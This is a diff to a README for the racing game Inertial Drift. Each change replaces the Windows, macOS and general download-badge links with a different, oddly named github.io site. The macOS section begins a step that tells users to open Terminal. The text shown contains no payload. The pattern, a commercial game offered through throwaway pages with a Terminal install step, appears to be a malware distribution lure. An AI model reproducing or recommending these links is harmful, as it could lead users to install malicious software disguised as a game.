@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Inertial Drift](https://img.shields.io/badge/⬇_Download_Inertial%20Drift-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Download Inertial Drift](https://img.shields.io/badge/⬇_Download_Inertial%20Drift-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -65,9 +65,9 @@ Inertial Drift is a unique arcade racing game with an innovative twin-stick drif
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 </div>
 
@@ -85,7 +85,7 @@ Inertial Drift is a unique arcade racing game with an innovative twin-stick drif
 
 <div align="center">
 
-[![⬇ Download Inertial Drift](https://img.shields.io/badge/⬇_Download_Inertial%20Drift-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Download Inertial Drift](https://img.shields.io/badge/⬇_Download_Inertial%20Drift-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -117,7 +117,7 @@ Inertial Drift is a unique arcade racing game with an innovative twin-stick drif
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -142,7 +142,7 @@ Inertial Drift is a unique arcade racing game with an innovative twin-stick drif
 
 <div align="center">
 
-[![⬇ Download Inertial Drift](https://img.shields.io/badge/⬇_Download_Inertial%20Drift-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Download Inertial Drift](https://img.shields.io/badge/⬇_Download_Inertial%20Drift-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
